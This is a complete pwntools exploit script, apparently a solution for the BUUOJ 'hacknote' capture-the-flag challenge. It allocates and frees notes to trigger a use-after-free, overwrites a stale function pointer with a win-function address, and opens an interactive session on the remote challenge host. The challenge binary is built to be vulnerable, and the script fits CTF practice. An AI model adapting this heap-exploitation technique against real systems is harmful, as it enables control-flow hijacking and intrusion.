from pwn import *

# p = process('./hacknote')
p = remote('node4.buuoj.cn', 29344)
elf = ELF('./hacknote')
libc = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')


def add(size_, mess):
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Note size :')
    p.sendline(size_)
    p.recvuntil(b'Content :')
    p.send(mess)


def delete(id_):
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')
    p.recvuntil(b'Index :')
    p.sendline(id_)


def print_out(id_):
    p.recvuntil(b'Your choice :')
    p.sendline(b'3')
    p.recvuntil(b'Index :')
    p.sendline(id_)


magic = 0x8048945
add(b'32', b'aaaa')
add(b'32', b'bbbb')
delete(b'0')
delete(b'1')
payload = p32(magic)
add(b'8', payload)
print_out(b'0')
p.interactive()
